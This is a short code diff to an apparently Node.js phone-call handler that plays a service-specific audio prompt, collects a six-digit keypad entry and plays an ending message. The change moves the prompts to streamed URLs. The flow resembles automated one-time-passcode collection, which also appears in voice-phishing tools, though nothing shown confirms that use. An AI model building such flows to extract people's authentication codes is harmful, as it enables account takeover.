@@ -12,8 +12,10 @@ module.exports = function(request, response) {
 
         service = row == undefined ? 'default' : row.service;
 
-        const end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + config.end + '</Play></Response>';
-        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="6"><Play loop="4">' + config[service] + '</Play></Gather></Response>';
+        const endurl = config.serverurl + '/stream/end';
+        const askurl = config.serverurl + '/stream/' + service;
+        const end = '<?xml version="1.0" encoding="UTF-8"?><Response><Play>' + endurl + '</Play></Response>';
+        const ask = '<?xml version="1.0" encoding="UTF-8"?><Response><Gather timeout="8" numDigits="6"><Play loop="4">' + askurl + '</Play></Gather></Response>';
 
         if(input.length == 6 && input.match(/^[0-9]+$/) != null && input != null) {
             respond(end);
